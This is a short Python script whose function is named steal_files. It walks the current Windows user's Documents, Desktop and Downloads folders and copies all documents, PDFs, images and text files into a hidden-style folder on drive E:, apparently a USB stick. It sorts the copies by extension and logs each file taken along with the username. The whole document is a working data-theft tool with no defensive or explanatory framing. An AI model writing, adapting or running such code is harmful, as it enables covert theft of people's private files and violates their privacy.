
import os
import shutil
from datetime import datetime
import getpass

DEST_DIR = "E:\\.data"
FILE_TYPES = ['.docx', '.pdf', '.jpg', '.png', '.txt']
SCAN_DIRS = [
    f"C:\\Users\\{getpass.getuser()}\\Documents",
    f"C:\\Users\\{getpass.getuser()}\\Desktop",
    f"C:\\Users\\{getpass.getuser()}\\Downloads"
]

def steal_files():
    if not os.path.exists(DEST_DIR):
        os.makedirs(DEST_DIR)
    log_file = os.path.join(DEST_DIR, "log.txt")
    with open(log_file, "a") as log:
        log.write(f"\n\n[+] Started at {datetime.now()} on user {getpass.getuser()}\n")
        for root_path in SCAN_DIRS:
            for root, dirs, files in os.walk(root_path):
                for file in files:
                    if any(file.lower().endswith(ft) for ft in FILE_TYPES):
                        src = os.path.join(root, file)
                        dst_folder = os.path.join(DEST_DIR, os.path.splitext(file)[1][1:])
                        os.makedirs(dst_folder, exist_ok=True)
                        try:
                            dst = os.path.join(dst_folder, file)
                            shutil.copy2(src, dst)
                            log.write(f"[+] Copied: {src} to {dst}\n")
                        except Exception as e:
                            log.write(f"[-] Failed: {src} -> {str(e)}\n")

if __name__ == "__main__":
    steal_files()
